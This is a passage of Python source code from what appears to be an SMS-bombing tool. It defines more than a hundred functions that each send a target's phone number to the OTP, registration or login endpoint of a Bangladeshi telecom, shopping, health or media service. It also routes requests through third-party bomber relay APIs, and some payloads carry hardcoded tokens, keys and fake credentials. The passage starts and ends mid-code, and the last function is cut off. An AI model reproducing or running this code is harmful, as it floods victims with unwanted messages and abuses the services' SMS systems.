        requests.get("http://bomber.ezyro.com/index.php?number="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx12():
    try:
        payload = {'number': ''+number, 'otp': ''}
        requests.post("https://www.abclit.com/student/sendotp", data=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx13():
    try:
        payload = {"id": ""+number}
        requests.get("https://cms.beta.praavahealth.com/api/v2/user/login/?mobile="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx14():
    try:
        payload = {"requestType":"send","phoneNumber":"+88"+number,"screenName":"signin"}
        requests.post("https://prod-api.viewlift.com/identity/signin?site=prothomalo", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx15():
    try:
        payload = {"phone":""+number}
        requests.post("https://api.shopoth.com/shop/api/v1/otps/send?warehouse_id=8", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx16():
    try:
        payload = {"mobile":"+88"+number,"type":1}
        requests.post("https://ecom.rangs.com.bd/send-otp-code", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx17():
    try:
        payload = {"UserName":"","UserPassword":"","chkRememberPassword":"","MobileNo":""+number}
        requests.post("https://pbs.com.bd/login/?handler=UserGetOtp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx18():
    try:
        payload = {"username":"+88"+number}
        requests.post("https://api.eat-z.com/auth/customer/signin", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx19():
    try:
        payload = {"form_key":"GkFycb1vkfGhZKLO","checkinput":""+number,"send":""}
        requests.post("https://www.aarong.com/otpverify/account/checklogin/", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx20():
    try:
        payload = {"contact":""+number}
        requests.get("https://admin.doctime.com.bd/api/otp/send", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx21():
    try:
        payload = {"msisdn":"88"+number,"token_type":"CUSTOM_TOKEN_V1","operator":"all","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE2ODYyMjM3NTUuMH0.mojSMMX1DHztRWgv7r4JnR1f2NDUReuS0TAkH7xA_CbV4E6Aoj31SN3ncWTdz8xQgkyr5ioIJ_eEI4fALXuamQ"}
        requests.get("https://api.bongo-solutions.com/auth/api/v2/login/send-otp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx22():
    try:
        payload = {"msisdn":""+number}
        requests.get("https://weblogin.grameenphone.com/backend/api/v1/otp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx23():
    try:
        payload = {"mobile":"+88"+number}
        requests.get("https://apix.rabbitholebd.com/appv2/login/requestOTP", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx24():
    try:
        payload = {"firstName":"Dipto Hira","lastName":"","mobileNumber":""+number}
        requests.get("https://api.zaynaxhealth.com/auth_service/auth/register/phone", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx25():
    try:
        payload = {"mobile":""+number}
        requests.get("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx26():
    try:
        payload = {"password":"MR.DIPTO","password_confirmation":"MR.DIPTO","device_key":"498babffa0d55f56f82f0f03af6e1b2e","name":"Termux","mobile":""+number,"social_login_id":"","email":"fuck14277@exdonuts.com"}
        requests.get("https://core.easy.com.bd/api/v1/registration", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx27():
    try:
        payload = {"number":""+number}
        requests.get("https://www.rokomari.com/resend-verification-code?email_phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx28():
    try:
        payload = {"business_name":"Termux","last_name":"Zone","phone_number":""+number,"first_name":"Termux "}
        requests.get("https://api.hishabpati.com/api/v1/merchant/register/otp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx29():
    try:
        payload = {"mobile":""+number,"appCode":"FairyLN"}
        requests.get("https://www.fairy-ln.xyz/fairyln/v2/ekbJKysHoKytmupUhds03ROjhy6uDuh8Mp9TkoHo6%2Bk%3D", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx30():
    try:
        payload = {"password":"53519864@@","full_name":"Imran","gender":"1","phone":""+number,"subscribe":"","date_of_birth":"2023-03-23","email":"infoafranzone@gmail.com"}
        requests.get("https://api.shopoth.com/shop/api/v1/users/signup?warehouse_id=8", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx31():
    try:
        payload = {"msisdn":""+number}
        requests.get("https://fundesh.com.bd/api/auth/generateOTP?service_key=", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx32():
    try:
        payload = {"method":"otp","mobile":""+number}
        requests.get("https://app.eonbazar.com/api/auth/login", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx33():
    try:
        payload = {"os":"web","mobile":"+88-"+number,"language":"en","deviceToken":"web"}
        requests.get("https://api.osudpotro.com/api/v1/users/send_otp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx34():
    try:
        payload = {"mobile":""+number}
        requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx35():
    try:
        payload = {"msisdn":"88"+number,"token_type":"CUSTOM_TOKEN_V1","operator":"all","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE2ODYyMjM3NTUuMH0.b1AE7E8tL0TmnqW1ivCoLB87A6FDl4Yhi1BCBuKjBhvzbjbeigjYUWiu-JbCGeI-gK3A7A62oIejfYroKfmALQ"}
        requests.get("https://api3.bioscopelive.com/auth/api/v2/login/send-otp", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx36():
    try:
        payload = {"name":"limon","phoneNumber":""+number,"service":"redx"}
        requests.get("https://api.redx.com.bd/v1/user/signup", params=payload)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnx37():
    try:
        headers = CaseInsensitiveDict()
        headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
        headers["User-Agent"] = "gzip"
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        data = "op=getOTC&pin=21799&app_version=78&msisdn=88"+number
        requests.post("https://circle.robi.com.bd/mylife/appapi/appcall.php", headers=headers, data=data)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass


#----------[ LMNx9 NEW API 97 ]-----------#


def LimonXRimu1():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/admissionbd.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu2():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/aibl.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😂 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu3():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/ali2bd.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😆 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu4():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/applink.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😜 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu5():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/arogga.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😅 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu6():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/bdtikets.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤪 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu7():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/bdtikets2.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu8():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/betonbook.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😹 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu9():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/bikroy.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤡 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu10():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/bioscope.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu11():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/bkash-biz.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu12():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/bl.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu13():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/bongobd.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu14():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/busbdlogin.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu15():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/byjus.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu16():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/chainaonline.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu17():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/chakrajan.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu18():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/chorki.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu19():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/cinematic.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😆 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu20():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/cineplex.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu21():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/cinespot.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu22():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/circel.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu23():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/dhakabank.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu24():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/dipto.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤪 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu25():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/dmss.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😛 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu26():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/doctime.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😵‍ REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu27():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/ecuriar.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😵‍💫 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu28():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/easy.com.bd.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu29():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/enobazar.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😁 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu30():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/entertainment.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😆 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu31():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/flexi-plan.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu32():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/fliper.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu33():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/fundesh.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu34():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/ghuri.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu35():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/gp.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😆 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu36():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/gpay.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🥲 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu37():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/gpshop.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😶  REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu38():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/grameendh.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu39():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/helth.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu40():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/helth-login.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😎 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu41():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/helth-reg.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu42():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/hisab-express.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu43():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/hisabelogin.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu44():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/hisabereg.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu45():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/hisabpati.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu46():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/hlpl.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu47():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/iqra.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😂 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu48():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/ivr.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu49():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/jatri.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu50():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/jeetwinbd.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu51():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/jotno.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😜 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu52():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/khaodao.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu53():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/kirebd.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu54():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/lazzpharma.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu55():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/lbfl.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu56():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/mcbaffiliate.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤯 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu57():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/mithai.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🥸 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu58():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/mojaenglish.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😵‍💫 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu59():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/mokam.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu60():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/moveon.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu61():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/nesco.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu62():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/obhai.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu63():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/ousodhpotro.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu64():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/paperflay.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤒 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu65():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/pathao.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😵 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu66():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/pravanahelth.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🥴 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu67():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/qcom.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😹 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu68():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/quizgiri.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😹 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu69():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/quiztime.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu70():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/redx.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu71():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/redx2.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😜 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu72():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/reseller-circel.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu73():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/robi-ivr-dorstep.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤡 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu74():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/robi-myoffer.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu75():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/robi-web.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu76():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/robi-web2.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😀 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu77():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/rootsedu.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 😲 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu78():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/rtv-forget.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu79():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/rtv-reg.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu80():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/runcash.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu81():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/sadhin.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤤 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu82():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/sajgoj.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🥴 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu83():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/sundarban.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🤧 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu84():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/senorbeuty.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 🥳 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu85():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/sikho.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu86():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/somvob.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu87():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/sopoth-reg.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu88():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/sopoth-resend.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu89():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/sudokkho.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu90():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/sundarban.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu91():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/talikhata.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu92():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/tap.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu93():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/thebodyshop.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu94():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/tota.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu95():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/trusty.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu96():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/vdoc.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def LimonXRimu97():
    try:requests.get("https://monsterteambd.co/RSBD/API/SMS/webacces.php?phone="+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass


#----------[ LMNx9 OLD SUB API 18 ]-----------#


def lmnXdraco1():
    try:requests.get('https://api.teamxdraco.my.id/SMS/api12.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco2():
    try:requests.get('https://api.teamxdraco.my.id/SMS/api13.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco3():
    try:requests.get('https://api.teamxdraco.my.id/SMS/api15.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco4():
    try:requests.get('https://api.teamxdraco.my.id/SMS/api16.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco5():
    try:requests.get('https://api.teamxdraco.my.id/SMS/api18.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco6():
    try:requests.get('https://api.teamxdraco.my.id/SMS/api4.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco7():
    try:requests.get('https://api.teamxdraco.my.id/SMS/api2.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco8():
    try:requests.get('https://api.teamxdraco.my.id/api17.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco9():
    try:requests.get('https://api.teamxdraco.my.id/api18.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco10():
    try:requests.get('https://api.teamxdraco.my.id/api19.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco11():
    try:requests.get('https://api.teamxdraco.my.id/api20.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco12():
    try:requests.get('https://api.teamxdraco.my.id/api21.php?phone='+number)
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco13():
    try:requests.get('https://api.teamxdraco.my.id/api22.php?phone='+number)        
    except Exception as x:
        print(f" {r}</> 💣 REQUESTS ERROR : {y}{x}")
        pass
def lmnXdraco14():
